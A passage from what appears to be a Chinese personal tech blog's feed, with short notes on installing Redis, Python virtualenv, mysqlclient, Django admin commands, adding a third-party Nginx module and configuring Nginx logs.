class="line">1282:M 09 May 04:53:34.540 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span><br><span class="line">1282:M 09 May 04:53:34.540 # Server started, Redis version 3.2.5</span><br><span class="line">1282:M 09 May 04:53:34.541 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add &apos;vm.overcommit_memory = 1&apos; to /etc/sysctl.conf and then reboot or run the command &apos;sysctl vm.overcommit_memory=1&apos; for this to take effect.</span><br><span class="line">1282:M 09 May 04:53:34.541 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command &apos;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&apos; as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.</span><br><span class="line">1282:M 09 May 04:53:34.541 * DB loaded from disk: 0.000 seconds</span><br><span class="line">1282:M 09 May 04:53:34.541 * The server is now ready to accept connections on port 6379</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; redis-cli</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="rpm&#x5B89;&#x88C5;Redis"><a href="#rpm&#x5B89;&#x88C5;Redis" class="headerlink" title="rpm&#x5B89;&#x88C5;Redis"></a>rpm&#x5B89;&#x88C5;Redis</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; yum install https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/r/redis-3.2.12-2.el7.x86_64.rpm</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">redis-3.2.12-2.el7.x86_64.rpm                                                                                                                        | 544 kB  00:00:01</span><br><span class="line">Examining /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm: redis-3.2.12-2.el7.x86_64</span><br><span class="line">Marking /var/tmp/yum-root-OuFo3f/redis-3.2.12-2.el7.x86_64.rpm to be installed</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package redis.x86_64 0:3.2.12-2.el7 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Processing Dependency: libjemalloc.so.1()(64bit) <span class="keyword">for</span> package: redis-3.2.12-2.el7.x86_64</span></span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: centos.nethub.com.hk</span><br><span class="line"> * epel: mirrors.neusoft.edu.cn</span><br><span class="line"> * extras: centos.nethub.com.hk</span><br><span class="line"> * updates: centos.nethub.com.hk</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Running transaction check</span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Package jemalloc.x86_64 0:3.6.0-1.el7 will be installed</span></span><br><span class="line"><span class="meta">--&gt;</span><span class="bash"> Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">============================================================================================================================================================================</span><br><span class="line"> Package                             Arch                              Version                                  Repository                                             Size</span><br><span class="line">============================================================================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> redis                               x86_64                            3.2.12-2.el7                             /redis-3.2.12-2.el7.x86_64                            1.4 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> jemalloc                            x86_64                            3.6.0-1.el7                              epel                                                  105 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">============================================================================================================================================================================</span><br><span class="line">Install  1 Package (+1 Dependent package)</span><br><span class="line"></span><br><span class="line">Total size: 1.5 M</span><br><span class="line">Total download size: 105 k</span><br><span class="line">Installed size: 1.7 M</span><br><span class="line">Is this ok [y/d/N]: y</span><br><span class="line">Downloading packages:</span><br><span class="line">jemalloc-3.6.0-1.el7.x86_64.rpm                                                                                                                      | 105 kB  00:00:00</span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : jemalloc-3.6.0-1.el7.x86_64                                                                                                                              1/2</span><br><span class="line">  Installing : redis-3.2.12-2.el7.x86_64                                                                                                                                2/2</span><br><span class="line">  Verifying  : redis-3.2.12-2.el7.x86_64                                                                                                                                1/2</span><br><span class="line">  Verifying  : jemalloc-3.6.0-1.el7.x86_64                                                                                                                              2/2</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  redis.x86_64 0:3.2.12-2.el7</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  jemalloc.x86_64 0:3.6.0-1.el7</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp; systemctl start redis</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.85.188:8081/uploads/1652923388117537180QQ20220508210823.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x6CE8;&#x610F;&#xFF1A;&#x4F7F;&#x7528;RPM&#x5305;&#x5B89;&#x88C5;redis&#x4F1A;&#x4F9D;&#x8D56;jemalloc&#x7A0B;&#x5E8F;&#x5305;&#xFF0C;jemalloc&#x662F;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5DE5;&#x5177;&#xFF0C;&#x6B64;&#x5305;&#x5728;epel&#x6E90;&#x4E2D;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x6982;&amp;#x8FF0;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x6982;&amp;#x8FF0;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x6982;&amp;#x8FF0;&quot;&gt;&lt;/a&gt;Redis&amp;#x6982;&amp;#x8FF0;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python-VirtualEnv</title>
    <link href="https://marnm.github.io//posts/1f351894/"/>
    <id>https://marnm.github.io//posts/1f351894/</id>
    <published>2022-06-07T04:48:42.000Z</published>
    <updated>2022-06-07T05:07:57.325Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&#x521B;&#x5EFA;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong></p><pre><code>virtualenv venv_dir</code></pre><p><strong>&#x6307;&#x5B9A;&#x7248;&#x672C;</strong></p><pre><code>virtualenv venv_dir --python=python3.7</code></pre><p><strong>&#x6FC0;&#x6D3B;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong><br>Windows:</p><pre><code>venv_dir\Scripts\activate</code></pre><p>Linux:</p><pre><code>source venv_dir\bin\activate</code></pre><p><strong>&#x9000;&#x51FA;&#x865A;&#x62DF;&#x73AF;&#x5883;</strong></p><pre><code>deactivate</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x521B;&amp;#x5EFA;&amp;#x865A;&amp;#x62DF;&amp;#x73AF;&amp;#x5883;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;virtualenv venv_dir
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&amp;#x6307;&amp;#x5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysqlclient无法安装的问题</title>
    <link href="https://marnm.github.io//posts/3e189d0c/"/>
    <id>https://marnm.github.io//posts/3e189d0c/</id>
    <published>2022-06-07T04:48:28.000Z</published>
    <updated>2022-06-07T05:08:18.494Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">sudo apt install -y mysql-client </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x57FA;&#x4E8E;python&#x5B89;&#x88C5;mysqlclient&#x9700;&#x8981;&#x4F9D;&#x6B21;&#x5B89;&#x88C5;&#x4EE5;&#x4E0B;&#x5E93;: </span></span><br><span class="line">sudo apt-get install libmysqlclient-dev </span><br><span class="line">sudo apt install libssl-dev </span><br><span class="line">sudo apt install libcrypto++-dev </span><br><span class="line">sudo pip3 install mysqlclient </span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6700;&#x540E;&#x8FD9;&#x9879;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x4E2D;&#x5B89;&#x88C5; </span></span><br><span class="line">pip install mysqlclient</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;spa
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Django教程</title>
    <link href="https://marnm.github.io//posts/5e357037/"/>
    <id>https://marnm.github.io//posts/5e357037/</id>
    <published>2022-06-07T04:48:14.000Z</published>
    <updated>2022-06-07T05:08:34.863Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&#x521B;&#x5EFA;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py cretesuperuser</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x4FEE;&#x6539;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x5BC6;&#x7801;</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py changepassword user_name</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x521B;&amp;#x5EFA;&amp;#x7BA1;&amp;#x7406;&amp;#x5458;&amp;#x8D26;&amp;#x6237;&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx动静分离部署</title>
    <link href="https://marnm.github.io//posts/f4d30967/"/>
    <id>https://marnm.github.io//posts/f4d30967/</id>
    <published>2022-06-07T04:47:56.000Z</published>
    <updated>2022-06-07T04:56:53.640Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx虚拟主机</title>
    <link href="https://marnm.github.io//posts/da411b72/"/>
    <id>https://marnm.github.io//posts/da411b72/</id>
    <published>2022-06-07T04:47:42.000Z</published>
    <updated>2022-06-07T04:56:53.655Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx添加第三方模块</title>
    <link href="https://marnm.github.io//posts/e0989926/"/>
    <id>https://marnm.github.io//posts/e0989926/</id>
    <published>2022-06-07T04:47:35.000Z</published>
    <updated>2022-06-07T05:09:09.445Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;"><a href="#Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;" class="headerlink" title="Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;"></a>Nginx&#x6DFB;&#x52A0;&#x7B2C;&#x4E09;&#x65B9;&#x6A21;&#x5757;</h2><blockquote><p>&#x4EE5;&#x4F1A;&#x8BDD;&#x4FDD;&#x6301;nginx-stiky&#x6A21;&#x5757;&#x4E3A;&#x4F8B;</p></blockquote><p>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/bymaximus/nginx-sticky-module-ng" target="_blank" rel="noopener">https://github.com/bymaximus/nginx-sticky-module-ng</a><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel76 nginx]$ nginx -V</span><br><span class="line">nginx version: nginx/1.12.2</span><br><span class="line">built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)</span><br><span class="line">built with OpenSSL 1.0.2k-fips  26 Jan 2017</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre</span><br><span class="line">[root@rhel76 nginx]$</span><br><span class="line"></span><br><span class="line">[root@rhel76 Packages]$ tar zxf master.tar.gz</span><br><span class="line">[root@rhel76 Packages]$ mv nginx-goodies-nginx-sticky-module-ng-08a395c66e42 /usr/local/nginx-stiky-module</span><br><span class="line">[root@rhel76 ~]$ ls /usr/local/nginx-stiky-module/</span><br><span class="line">basic.t  Changelog.txt  config  docs  LICENSE  ngx_http_sticky_misc.c  ngx_http_sticky_misc.h  ngx_http_sticky_module.c  patches  README.md</span><br><span class="line">[root@rhel76 ~]$ cd /usr/local/src/nginx-1.12.2/</span><br><span class="line">[root@rhel76 nginx-1.12.2]$ ./configure --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre</span><br><span class="line">[root@rhel76 nginx-1.12.2]$ make</span><br><span class="line"></span><br><span class="line">[root@rhel76 nginx-1.12.2]$ nginx -V</span><br><span class="line">nginx version: nginx/1.12.2</span><br><span class="line">built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)</span><br><span class="line">built with OpenSSL 1.0.2k-fips  26 Jan 2017</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre</span><br><span class="line"></span><br><span class="line">[root@rhel76 nginx-1.12.2]$ nginx -s stop</span><br><span class="line"></span><br><span class="line">[root@rhel76 nginx-1.12.2]$ pwd</span><br><span class="line">/usr/local/src/nginx-1.12.2</span><br><span class="line">[root@rhel76 nginx-1.12.2]$ ls</span><br><span class="line">auto  CHANGES  CHANGES.ru  conf  configure  contrib  html  LICENSE  Makefile  man  objs  README  src</span><br><span class="line">[root@rhel76 nginx-1.12.2]$ cp ./objs/nginx /usr/local/nginx/sbin/</span><br><span class="line">cp: overwrite &#x2018;/usr/local/nginx/sbin/nginx&#x2019;? yes</span><br><span class="line"></span><br><span class="line">[root@rhel76 nginx-1.12.2]$ nginx</span><br><span class="line">[root@rhel76 nginx-1.12.2]$ nginx -V</span><br><span class="line">nginx version: nginx/1.12.2</span><br><span class="line">built by gcc 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC)</span><br><span class="line">built with OpenSSL 1.0.2k-fips  26 Jan 2017</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/usr/local/nginx --add-module=/usr/local/nginx-stiky-module/ --with-http_stub_status_module --with-http_sub_module --with-http_ssl_module --with-pcre</span><br><span class="line">[root@rhel76 nginx-1.12.2]$</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Nginx&amp;#x6DFB;&amp;#x52A0;&amp;#x7B2C;&amp;#x4E09;&amp;#x65B9;&amp;#x6A21;&amp;#x5757;&quot;&gt;&lt;a href=&quot;#Nginx&amp;#x6DFB;&amp;#x52A0;&amp;#x7B2C;&amp;#x4E09;&amp;#x65B9;&amp;#x6A21;&amp;#x575
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx日志管理</title>
    <link href="https://marnm.github.io//posts/2793eb31/"/>
    <id>https://marnm.github.io//posts/2793eb31/</id>
    <published>2022-06-07T04:47:28.000Z</published>
    <updated>2022-06-07T05:09:38.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"><a href="#Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;" class="headerlink" title="Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;"></a>Nginx&#x65E5;&#x5FD7;&#x7BA1;&#x7406;</h2><p><strong>Nginx&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF1A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x548C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;</strong></p><p>&#x65E5;&#x5FD7;&#x5F00;&#x5173;&#x5728;Nginx&#x914D;&#x7F6E;&#x6587;&#x4EF6;<code>nginx.conf</code>&#x4E2D;&#x8BBE;&#x7F6E;&#xFF0C;&#x4E24;&#x79CD;&#x65E5;&#x5FD7;&#x90FD;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x6027;&#x5173;&#x95ED;&#xFF0C;&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;&#x7684;&#x3002;</p><p><strong>&#x5173;&#x95ED;&#x65E5;&#x5FD7;&#x7684;&#x65B9;&#x5F0F;</strong></p><pre><code>access_log off;error_log /dev/null;</code></pre><p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;Nginx&#x8FDB;&#x7A0B;&#x8BBE;&#x7F6E;&#x7684;&#x7528;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x5FC5;&#x987B;&#x5BF9;&#x65E5;&#x5FD7;&#x8DEF;&#x5F84;&#x6709;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x62A5;&#x9519;&#xFF01;</p><h2 id="&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access-log"><a href="#&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access-log" class="headerlink" title="&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access.log"></a>&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;access.log</h2><p>&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x683C;&#x5F0F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x3002;&#x901A;&#x8FC7;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7528;&#x6237;&#x5730;&#x57DF;&#x6765;&#x6E90;&#x3001;&#x8DF3;&#x8F6C;&#x6765;&#x6E90;&#x3001;&#x4F7F;&#x7528;&#x7EC8;&#x7AEF;&#x3001;&#x67D0;&#x4E2A;URL&#x8BBF;&#x95EE;&#x91CF;&#x7B49;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x3002;</p><p>&#x80FD;&#x591F;&#x4F7F;&#x7528;access_log&#x6307;&#x4EE4;&#x7684;&#x5B57;&#x6BB5;&#x5305;&#x62EC;&#xFF1A;http&#x3001;server&#x3001;location</p><p>&#x89C2;&#x5BDF;nginx&#x7684;http&#x6BB5;,&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x7C7B;&#x4F3C;&#x4FE1;&#x606F;(&#x65E5;&#x5FD7;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x65E5;&#x5FD7;&#x914D;&#x7F6E;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;)</p><pre><code>   &#x65E5;&#x5FD7;&#x7C7B;&#x578B;       &#x65E5;&#x5FD7;&#x8DEF;&#x5F84;            &#x65E5;&#x5FD7;&#x683C;&#x5F0F;#  access_log    logs/access.log     main;</code></pre><p>&#x8FD9;&#x8BF4;&#x660E;&#x8BE5;http&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x7684;&#x6587;&#x4EF6;&#x662F;logs/access.log &#xFF0C;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x201D;main&#x201D;&#x683C;&#x5F0F;&#xFF0C;main&#x683C;&#x5F0F;&#x662F;nginx&#x5B9A;&#x4E49;&#x597D;&#x4E00;&#x79CD;&#x65E5;&#x5FD7;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x65E5;&#x5FD7;&#x5B9A;&#x4E49;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">#                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">#                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x65E5;&#x5FD7;&#x53D8;&#x91CF;"><a href="#&#x65E5;&#x5FD7;&#x53D8;&#x91CF;" class="headerlink" title="&#x65E5;&#x5FD7;&#x53D8;&#x91CF;"></a>&#x65E5;&#x5FD7;&#x53D8;&#x91CF;</h3><p><code>$server_name</code>&#xFF1A;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x3002;<br><code>$remote_addr</code>&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;IP&#x5730;&#x5740;&#x3002;<br><code>-</code>&#xFF1A;&#x7A7A;&#x767D;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x201D;-&#x201C;&#x5360;&#x4F4D;&#x7B26;&#x66FF;&#x4EE3;&#xFF0C;&#x5386;&#x53F2;&#x539F;&#x56E0;&#x5BFC;&#x81F4;&#x8FD8;&#x5B58;&#x5728;<br><code>$remote_user</code>&#xFF1A;&#x8FDC;&#x7A0B;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x540D;&#x79F0;&#xFF0C;&#x7528;&#x4E8E;&#x8BB0;&#x5F55;&#x6D4F;&#x89C8;&#x8005;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65F6;&#x63D0;&#x4F9B;&#x7684;&#x540D;&#x5B57;&#xFF0C;&#x5982;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x540D;Jaking666&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x767B;&#x5F55;&#x5C31;&#x662F;&#x7A7A;&#x767D;&#x3002;<br><code>$time_local</code>&#xFF1A;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x95F4;&#x4E0E;&#x65F6;&#x533A;&#xFF0C;&#x6BD4;&#x5982;18/Jul/2012:17:00:01 